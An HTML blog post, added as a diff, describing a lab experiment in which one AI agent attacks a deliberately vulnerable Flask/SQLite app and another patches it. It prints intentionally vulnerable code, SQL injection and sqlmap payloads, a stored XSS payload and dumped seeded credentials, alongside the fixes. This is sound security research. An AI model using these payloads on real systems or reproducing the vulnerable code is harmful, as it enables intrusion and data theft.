@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>When AI Attacks Itself | Security Write-up</title>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500&family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #050507;
+            --card-bg: rgba(22, 22, 26, 0.85);
+            --primary: #00f2ff;
+            --secondary: #39ff14;
+            --text: #e0e0e0;
+            --muted: #888;
+        }
+
+        body {
+            background-color: var(--bg);
+            background-image: 
+                linear-gradient(rgba(0, 242, 255, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 242, 255, 0.03) 1px, transparent 1px);
+            background-size: 30px 30px;
+            color: var(--text);
+            font-family: 'Tajawal', sans-serif;
+            margin: 0;
+            line-height: 1.7;
+        }
+
+        /* Overlay grid effect */
+        body::before {
+            content: " ";
+            display: block;
+            position: fixed;
+            top: 0; left: 0; bottom: 0; right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%), 
+                        linear-gradient(90deg, rgba(255, 0, 0, 0.02), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.02));
+            z-index: 9999;
+            pointer-events: none;
+            background-size: 100% 3px, 3px 100%;
+        }
+
+        nav {
+            padding: 20px;
+            background: rgba(5, 5, 7, 0.9);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid rgba(0, 242, 255, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        nav a {
+            color: var(--text);
+            text-decoration: none;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.9rem;
+            transition: 0.3s;
+            margin-right: 20px;
+        }
+
+        nav a:hover {
+            color: var(--primary);
+            text-shadow: 0 0 5px var(--primary);
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 40px auto;
+            padding: 0 20px;
+            position: relative;
+            z-index: 2;
+        }
+
+        header {
+            border-bottom: 1px solid rgba(0, 242, 255, 0.2);
+            padding-bottom: 20px;
+            margin-bottom: 40px;
+        }
+
+        h1 {
+            color: var(--primary);
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px rgba(0, 242, 255, 0.3);
+        }
+
+        h2 {
+            color: var(--secondary);
+            margin-top: 50px;
+            border-left: 3px solid var(--secondary);
+            padding-left: 10px;
+            font-family: 'Fira Code', monospace;
+        }
+
+        h3 {
+            color: var(--primary);
+            margin-top: 30px;
+            font-family: 'Fira Code', monospace;
+        }
+
+        .meta {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+            color: var(--muted);
+            margin-bottom: 20px;
+        }
+
+        .tags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .tag {
+            background: rgba(57, 255, 20, 0.1);
+            color: var(--secondary);
+            border: 1px solid rgba(57, 255, 20, 0.3);
+            padding: 3px 10px;
+            border-radius: 4px;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.8rem;
+        }
+
+        pre {
+            background: #0a0a0c;
+            border: 1px solid rgba(0, 242, 255, 0.2);
+            border-left: 3px solid var(--primary);
+            padding: 15px;
+            border-radius: 4px;
+            overflow-x: auto;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.9rem;
+            color: #c5c8c6;
+            line-height: 1.5;
+            box-shadow: inset 0 0 10px rgba(0,0,0,0.5);
+        }
+
+        code {
+            font-family: 'Fira Code', monospace;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 2px 5px;
+            border-radius: 3px;
+            color: var(--secondary);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            background: rgba(22, 22, 26, 0.5);
+        }
+
+        th, td {
+            border: 1px solid rgba(0, 242, 255, 0.2);
+            padding: 12px;
+            text-align: left;
+        }
+
+        th {
+            background: rgba(0, 242, 255, 0.1);
+            color: var(--primary);
+            font-family: 'Fira Code', monospace;
+        }
+
+        ul.checklist {
+            list-style-type: none;
+            padding-left: 0;
+        }
+
+        ul.checklist li {
+            font-family: 'Fira Code', monospace;
+            margin-bottom: 10px;
+        }
+
+        .alert-box {
+            background: rgba(255, 0, 0, 0.1);
+            border-left: 3px solid #ff4444;
+            padding: 15px;
+            margin: 30px 0;
+            color: #ffaaaa;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.9rem;
+        }
+
+        footer {
+            text-align: center;
+            padding: 40px;
+            border-top: 1px solid #222;
+            margin-top: 60px;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.8rem;
+            color: var(--muted);
+        }
+    </style>
+</head>
+<body>
+
+    <nav>
+        <a href="../index.html">← cd ../home</a>
+        <a href="#setup">// Setup</a>
+        <a href="#phase1">// Phase 1</a>
+        <a href="#phase2">// Phase 2</a>
+        <a href="#timeline">// Timeline</a>
+    </nav>
+
+    <div class="container">
+        <header>
+            <h1>When AI Attacks Itself: A Fully Autonomous Red Team vs Blue Team Experiment</h1>
+            <div class="meta">Date: June 22, 2026 · Environment: Kali Linux VM · Azure OpenAI · Docker</div>
+            <div class="tags">
+                <span class="tag">AI Security</span>
+                <span class="tag">Penetration Testing</span>
+                <span class="tag">AppSec</span>
+                <span class="tag">Autonomous Agents</span>
+                <span class="tag">GPT-4o</span>
+                <span class="tag">gpt-5.2</span>
+            </div>
+        </header>
+
+        <section>
+            <h2>The Idea I Couldn't Get Out of My Head</h2>
+            <p>What if two AI agents fought each other — one building and defending a web application, the other trying to break in? Two different models. No human intervention. No waiting. No typos in terminal commands.</p>
+            <p>I ran the experiment. The results were more interesting than I expected — not just because the attack and defense both worked, but because of how fast everything happened.</p>
+        </section>
+
+        <section id="setup">
+            <h2>The Setup</h2>
+            <p>Two models. Two roles. One isolated Kali Linux VM.</p>
+            
+            <table>
+                <thead>
+                    <tr>
+                        <th>Agent</th>
+                        <th>Model</th>
+                        <th>Role</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>🔴 Red Agent</td>
+                        <td>GPT-4o (Azure OpenAI)</td>
+                        <td>Attack, analyze findings, verify patch</td>
+                    </tr>
+                    <tr>
+                        <td>🔵 Blue Agent</td>
+                        <td>gpt-5.2 (Azure OpenAI)</td>
+                        <td>Build target app, patch vulnerabilities</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <p><strong>Target stack:</strong> Flask · SQLite · Werkzeug 3.1.8 · Python 3.11.15 · Docker</p>
+            
+            <p>Why two different models? Using GPT-4o for offense and gpt-5.2 for defense creates genuine asymmetry — each model brings different reasoning patterns to its role. A single model playing both sides would produce biased results.</p>
+            
+            <p>A note on tooling: We started with AutoGen for agent orchestration, but hit a library conflict — AutoGen's bundled <code>openai v0.x</code> clashed with the modern <code>openai v1.x</code> SDK. We scrapped it and called the Azure OpenAI API directly. Simpler, faster, no magic.</p>
+        </section>
+
+        <section id="phase1">
+            <h2>Phase 1: Proof of Concept</h2>
+            
+            <h3>Act 1 — Blue Agent Builds the Target ⏱️ 15 seconds</h3>
+            <p>Blue Agent (gpt-5.2) was given one instruction: build a Flask/SQLite web app, deploy it via Docker, and intentionally leave two vulnerabilities in it for the experiment.</p>
+            
+            <p><strong>Vulnerability 1: SQL Injection</strong></p>
+<pre><code># ❌ User input injected directly into SQL query
+query = f"SELECT * FROM users WHERE username='{user}' AND password='{pwd}'"
+cur.execute(query)</code></pre>
+
+            <p><strong>Vulnerability 2: Stored XSS</strong></p>
+<pre><code># ❌ Raw user input stored and rendered without sanitization
+comments_html = "".join(f"&lt;p&gt;{r[0]}&lt;/p&gt;" for r in rows)</code></pre>
+
+            <p>The database was pre-seeded with two users: <code>admin:secret123</code> and <code>alice:pass456</code>.</p>
+            <p>From script execution to Container vulnerable-webapp Started: 15 seconds.</p>
+<pre><code>$ curl -s http://localhost:5000/login | grep -o "&lt;h2&gt;.*&lt;/h2&gt;"
+&lt;h2&gt;Login&lt;/h2&gt;   # ✅ App is live on port 5000</code></pre>
+
+            <h3>Act 2 — Red Agent Attacks ⏱️ 70 seconds</h3>
+            <p>Red Agent (GPT-4o) ran a four-phase attack script automatically.</p>
+            
+            <p><strong>Phase 1 — Reconnaissance: nmap (6.38 seconds)</strong></p>
+<pre><code>PORT     STATE SERVICE VERSION
+5000/tcp open  http    Werkzeug httpd 3.1.8 (Python 3.11.15)</code></pre>
+            <p>Framework version fingerprinted. We know exactly what we're dealing with.</p>
+
+            <p><strong>Phase 2 — Manual SQL Injection (< 1 second)</strong></p>
+<pre><code>Payload:  admin' OR '1'='1
+Response: ✅ Welcome admin!</code></pre>
+            <p>Login bypassed on the first attempt. Classic OR-based injection.</p>
+
+            <p><strong>Phase 3 — sqlmap Automated Scan (10 seconds)</strong></p>
+            <p>sqlmap automatically identified the backend as SQLite, then discovered three injection techniques on the same username parameter:</p>
+<pre><code>Type: boolean-based blind
+Payload: username=admin' AND CASE WHEN 1348=1348 THEN 1348
+         ELSE JSON(CHAR(69,74,90,69)) END AND 'xgKy'='xgKy
+
+Type: time-based blind
+Payload: username=admin' AND 7314=LIKE(CHAR(65,66,67,68,69,70,71),
+         UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'fesM'='fesM
+
+Type: UNION query (3 columns)
+Payload: username=-5323' UNION ALL SELECT NULL,CHAR(113,120,112,107,113)
+         ||CHAR(70,109,100,...)||CHAR(113,120,118,106,113),NULL-- qZAZ</code></pre>
+            <p>Then dumped the entire database — 100 HTTP requests total:</p>
+<pre><code>Database: SQLite_masterdb
+Table: users
++----+-----------+----------+
+| id | password  | username |
++----+-----------+----------+
+| 1  | secret123 | admin    |
+| 2  | pass456   | alice    |
++----+-----------+----------+</code></pre>
+
+            <p><strong>Phase 4 — Stored XSS (< 1 second)</strong></p>
+<pre><code>Payload stored:  &lt;script&gt;alert("XSS_PWNED")&lt;/script&gt;
+Reflected back:  ✅ Script tag present — executes in any visitor's browser</code></pre>
+
+            <p>Total: 70 seconds. 100 HTTP requests. Every credential stolen. XSS payload live.</p>
+            <p>GPT-4o then analyzed its own attack output and produced a structured threat intelligence report:</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Vulnerability</th>
+                        <th>Severity</th>
+                        <th>Impact</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>SQL Injection</td>
+                        <td>Critical</td>
+                        <td>Full database compromise, authentication bypass</td>
+                    </tr>
+                    <tr>
+                        <td>Stored XSS</td>
+                        <td>High</td>
+                        <td>Arbitrary JavaScript execution on all visitors</td>
+                    </tr>
+                </tbody>
+            </table>
+            <p>API cost for this analysis: 4,667 tokens — roughly $0.05.</p>
+
+            <h3>Act 3 — Blue Agent Patches the Code ⏱️ 30 seconds</h3>
+            <p>The GPT-4o threat report was passed directly to Blue Agent (gpt-5.2) along with the vulnerable <code>app.py</code>. No human read the report. No human wrote the fix.</p>
+            
+            <p><strong>Fix 1: Parameterized Queries</strong></p>
+<pre><code># ✅ SQL logic and user data are now completely separated
+cur.execute("SELECT * FROM users WHERE username=? AND password=?", (user, pwd))</code></pre>
+            <p>The database driver handles escaping. User input is always treated as a literal value — never as SQL syntax.</p>
+
+            <p><strong>Fix 2: Output Encoding + CSP Header</strong></p>
+<pre><code># ✅ Special characters neutralized before rendering
+import html
+comments_html = "".join(f"&lt;p&gt;{html.escape(r[0])}&lt;/p&gt;" for r in rows)
+# + Content-Security-Policy: script-src 'self'  (added to response headers)</code></pre>
+
+            <p>Blue Agent automatically saved a backup of the original file (<code>app.py.backup</code>), wrote the patched version, and the orchestrator triggered a Docker rebuild:</p>
+<pre><code>[+] Building 1.6s (11/11) FINISHED
+✔ Container vulnerable-webapp  Started ✅</code></pre>
+            <p>API cost for patch generation: 2,561 tokens — roughly $0.03.</p>
+
+            <h3>Act 4 — Red Agent Confirms the Fix ⏱️ 3 seconds</h3>
+            <p>Same payloads. Same tools. Different result.</p>
+            
+            <p><strong>SQL Injection — blocked</strong></p>
+<pre><code>Payload: admin' OR '1'='1
+Result:  ❌ Invalid credentials</code></pre>
+            
+            <p><strong>sqlmap — full arsenal, nothing found</strong></p>
+<pre><code>[WARNING] POST parameter 'username' does not seem to be injectable
+[WARNING] POST parameter 'password' does not seem to be injectable
+[CRITICAL] all tested parameters do not appear to be injectable.</code></pre>
+            <p>sqlmap tried every technique it had. All failed.</p>
+
+            <p><strong>Stored XSS — escaped</strong></p>
+<pre><code>Input:  &lt;script&gt;alert("XSS_PWNED")&lt;/script&gt;
+Output: &amp;lt;script&amp;gt;alert(&amp;quot;XSS_PWNED&amp;quot;)&amp;lt;/script&amp;gt;</code></pre>
+            <p>Stored as plain text. Browser renders it, doesn't execute it.</p>
+            
+            <p>Legitimate login still works:</p>
+<pre><code>username=admin&amp;password=secret123  →  ✅ Welcome admin!</code></pre>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Vulnerability</th>
+                        <th>Before Patch</th>
+                        <th>After Patch</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>SQL Injection — manual</td>
+                        <td>❌ Exploited</td>
+                        <td>✅ Blocked</td>
+                    </tr>
+                    <tr>
+                        <td>SQL Injection — sqlmap</td>
+                        <td>❌ Full DB dumped</td>
+                        <td>✅ Not injectable</td>
+                    </tr>
+                    <tr>
+                        <td>Stored XSS</td>
+                        <td>❌ Script executed</td>
+                        <td>✅ Escaped to plain text</td>
+                    </tr>
+                    <tr>
+                        <td>Legitimate login</td>
+                        <td>✅ Works</td>
+                        <td>✅ Still works</td>
+                    </tr>
+                </tbody>
+            </table>
+        </section>
+
+        <section id="phase2">
+            <h2>Phase 2: Fully Autonomous Closed-Loop</h2>
+            <p>Phase 1 proved the concept with manual handoffs between steps. Phase 2 eliminated them entirely.</p>
+            <p><code>orchestrator.py</code> connects both agents in a <strong>Closed-Loop Feedback System</strong> — a self-healing security pipeline that runs start-to-finish with a single command: <code>python3 orchestrator.py</code>.</p>
+
+<pre><code>[Orchestrator] ──── launch ────► [Red Agent GPT-4o: Attack]
+      │                                        │
+  rebuild Docker                         generate report
+      │                                        │
+      ▼                                        ▼
+[Docker Container] ◄── patch ── [Blue Agent gpt-5.2: Defense]
+      │
+  new container live
+      │
+      ▼
+[Red Agent GPT-4o: Verification Mode]
+  → receives patched source code
+  → reasons about bypass possibilities
+  → confirms: SECURE ✅</code></pre>
+
+            <p>The critical engineering decision in Phase 4: Red Agent doesn't just re-run <code>attack.sh</code>. It receives the actual patched Python source code and reasons about whether its previous payloads could succeed against the new logic. This is code-level security analysis, not blind tool re-execution.</p>
+
+            <h3>Live Orchestrator Output</h3>
+<pre><code>🚀 Starting Joint Operations Room: Red Team vs Blue Team...
+==================================================
+
+🔥 [Phase 1] Launching Red Agent (GPT-4o)...
+📝 Red Agent successfully generated attack report!
+
+🛡️ [Phase 2] Orchestrator hands report to Blue Agent (gpt-5.2)...
+🛠️ Blue Agent patched the code and rewrote app.py automatically!
+
+🐳 [Phase 3] Orchestrator rebuilds Docker with patched code...
+🔄 Container updated. Secure version now live.
+
+🎯 [Phase 4] Calling Red Agent for verification audit...
+
+==================================================
+🏁 Final Verification Report:
+
+1. SQL Injection:
+   Patched: cur.execute("SELECT ... WHERE username=?", (user,))
+   Payload: admin' OR '1'='1
+   Result:  ❌ BLOCKED — Parameterized queries neutralize the injection.
+
+2. Stored XSS:
+   Patched: html.escape() + Content-Security-Policy: script-src 'self'
+   Payload: &lt;script&gt;alert('XSS')&lt;/script&gt;
+   Result:  ❌ BLOCKED — Rendered as &amp;lt;script&amp;gt;. CSP blocks inline JS.
+
+System Status: SECURE 🛡️
+==================================================</code></pre>
+
+            <h3>Why the CSP Header Is the Interesting Part</h3>
+            <p>Blue Agent applied Defense-in-Depth without being explicitly asked:</p>
+            <ul>
+                <li><strong>Layer 1:</strong> <code>html.escape()</code> converts <code>&lt;script&gt;</code> → <code>&amp;lt;script&amp;gt;</code> at the Python level</li>
+                <li><strong>Layer 2:</strong> <code>Content-Security-Policy: script-src 'self'</code> tells the browser to refuse any inline JavaScript, even if encoding somehow fails</li>
+            </ul>
+            <p>Both layers must fail simultaneously for XSS to succeed. The model reasoned about this independently — it wasn't in the prompt.</p>
+        </section>
+
+        <section id="timeline">
+            <h2>The Complete Timeline</h2>
+<pre><code>18:36:58  🔵 gpt-5.2 builds app → Docker starts              ~15s
+18:37:06  🔴 GPT-4o begins attack
+          ├── nmap: Werkzeug 3.1.8 / Python 3.11.15          6.38s
+          ├── SQLi: login bypassed on first payload           &lt;1s
+          ├── sqlmap: 3 injection types, full DB dump         10s
+          └── XSS: payload stored and reflected               &lt;1s
+                                                    ──────────────
+                                                    70s total
+                                                    100 HTTP reqs
+
+18:37:16  🤖 GPT-4o analyzes findings                1 call · 4,667 tokens
+          🔵 gpt-5.2 patches app.py                  1 call · 2,561 tokens
+          🐳 Docker rebuild                           ~20s (cached layers)
+
+19:44:16  🔴 GPT-4o re-tests patched app             3s — all blocked
+
+──────────────────────────────────────────────────────────────────
+⏱️  Full cycle, start to finish:  &lt; 2 minutes
+💰  Total Azure OpenAI cost:      ~$0.08
+👤  Human intervention:           zero</code></pre>
+        </section>
+
+        <section>
+            <h2>What This Actually Means</h2>
+            <p><strong>Speed is the real shift.</strong><br>
+            What traditionally takes days — Red Team engagement, developer reads report, writes fix, gets it reviewed, deploys — happened in under two minutes. Not because AI is smarter than a human security engineer. Because it doesn't stop, doesn't need context-switching, and doesn't wait for a Slack reply.</p>
+            
+            <p><strong>Two models beat one.</strong><br>
+            GPT-4o on offense and gpt-5.2 on defense created genuine asymmetry. The experiment would have been less honest — and less interesting — with a single model playing both sides.</p>
+            
+            <p><strong>Ditch the framework when it fights you.</strong><br>
+            AutoGen looked good on paper. When its bundled <code>openai v0.x</code> clashed with our <code>openai v1.x</code>, we spent zero time debugging it and called the API directly. Sometimes the abstraction isn't worth it.</p>
+            
+            <p><strong>AI doesn't invent, it compresses.</strong><br>
+            SQL Injection is in OWASP Top 10. sqlmap is public. Parameterized queries are documented everywhere. What AI did here was collapse the time between knowing and doing — from days to seconds.</p>
+            
+            <p><strong>The real implication.</strong><br>
+            If an attacker can automate a full recon-exploit-report cycle in 70 seconds for $0.05, the defender's response window shrinks to something only automation can match. This experiment is a small demonstration of that pressure.</p>
+        </section>
+
+        <section>
+            <h2>What's Next</h2>
+            <ul class="checklist">
+                <li>[ ] Add CSRF and IDOR to the target app and repeat</li>
+                <li>[ ] Test whether Red Agent can find vulnerabilities it wasn't told about</li>
+                <li>[ ] Pit GPT-4o vs gpt-5.2 in both roles and compare outcomes</li>
+                <li>[ ] Build a real-time terminal dashboard for the orchestration loop</li>
+                <li>[ ] Extend to DAST scanning with OWASP ZAP</li>
+            </ul>
+
+            <p style="margin-top: 30px; font-family: 'Fira Code', monospace; font-size: 0.9rem;">
+                > Full source code and setup instructions: <a href="https://github.com/YOUR_USERNAME/ai-red-blue-lab" style="color: var(--primary);">https://github.com/AbdaullahAG/autonomous-ai-red-blue-lab</a>
+            </p>
+
+            <div class="alert-box">
+                [!] All tests conducted in a completely isolated VM environment. Never apply these techniques to systems without explicit written permission.
+            </div>
+        </section>
+    </div>
+
+    <footer>
+        <p>&copy; 2026 Abdullah Abughallous | Security Research</p>
+    </footer>
+
+</body>
+</html>
